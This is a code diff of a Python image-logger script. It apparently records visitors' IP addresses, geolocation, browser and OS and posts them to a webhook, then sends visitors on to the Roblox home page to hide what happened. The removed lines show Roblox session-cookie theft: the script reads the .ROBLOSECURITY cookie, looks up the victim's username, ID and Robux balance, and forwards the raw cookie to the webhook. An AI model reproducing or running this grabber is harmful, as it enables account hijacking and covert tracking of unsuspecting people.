@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.roblox.com/home" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -74,7 +74,6 @@ def botCheck(ip, useragent):
     else:
         return False
 
-
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
@@ -88,7 +87,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip,cookie , useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -109,26 +108,6 @@ def makeReport(ip,cookie , useragent = None, coords = None, endpoint = "N/A", ur
         return
 
     ping = "@everyone"
-
-    session = requests.Session()
-    session.cookies['.ROBLOSECURITY'] = cookie
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
-    
-    user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
-    if user_resp.status_code != 200:
-        return None
-    user_data = user_resp.json()
-    uid = user_data.get('id')
-    username = user_data.get('name', 'Unknown')
-        
-    robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
-    if robux_resp.status_code != 200:
-        return {'username': username, 'id': str(uid), 'robux': 'Error', 'cookie': cookie}
-        
-    robux_data = robux_resp.json()
-    robux = robux_data.get('robux', 0)
-        
-    
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -170,13 +149,7 @@ def makeReport(ip,cookie , useragent = None, coords = None, endpoint = "N/A", ur
             "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-
-**Roblox Info:**
-> **Username:** `{username if username else 'Unknown'}`
-> **ID:** `{uid if uid else 'Unknown'}`
-> **Robux:** `{robux if robux else 'Unknown'}`
-> **Cookie:** `{cookie if cookie else 'Unknown'}`      
-
+            
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
@@ -282,7 +255,6 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message = message.replace("{username}", result["username"])
 
                 datatype = 'text/html'
 
